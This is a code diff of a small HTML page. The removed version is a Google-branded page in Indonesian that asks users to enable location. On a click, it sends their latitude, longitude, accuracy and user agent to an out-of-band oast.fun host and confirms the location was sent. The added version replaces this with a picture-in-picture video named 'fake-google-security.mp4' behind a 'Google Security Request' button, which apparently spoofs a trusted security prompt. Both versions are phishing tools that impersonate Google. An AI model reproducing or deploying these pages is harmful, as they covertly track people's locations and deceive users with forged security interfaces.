@@ -1,55 +1,15 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Google Location</title>
-  <meta name="theme-color" content="#4285f4">
-  <link rel="icon" href="https://www.google.com/favicon.ico">
-  <style>
-    body {
-      font-family: Roboto, sans-serif;
-      text-align: center;
-      margin-top: 100px;
-      background: #fff;
-    }
-    button {
-      font-size: 18px;
-      padding: 14px 28px;
-      background: #4285f4;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-    button:hover {
-      background: #3367d6;
-    }
-  </style>
-</head>
+<head><title>Secure Video</title></head>
 <body>
+  <video id="spoofVideo" src="fake-google-security.mp4" autoplay muted loop></video>
+  <button onclick="runPip()">Google Security Request</button>
 
-<h2>Google ingin mengakses lokasimu</h2>
-<p>Klik tombol di bawah untuk mengaktifkan lokasi</p>
-
-<button onclick="getLoc()">Aktifkan Lokasi</button>
-
-<script>
-function getLoc() {
-  navigator.geolocation.getCurrentPosition(pos => {
-    fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
-      method: 'POST',
-      body: new URLSearchParams({
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude,
-        acc: pos.coords.accuracy,
-        ua: navigator.userAgent
-      })
-    });
-    alert('Lokasi berhasil dikirim ke sistem.');
-  }, err => {
-    alert('Akses lokasi ditolak.');
-  });
-}
-</script>
-
+  <script>
+    async function runPip() {
+      const v = document.getElementById("spoofVideo");
+      await v.requestPictureInPicture();
+    }
+  </script>
 </body>
 </html>
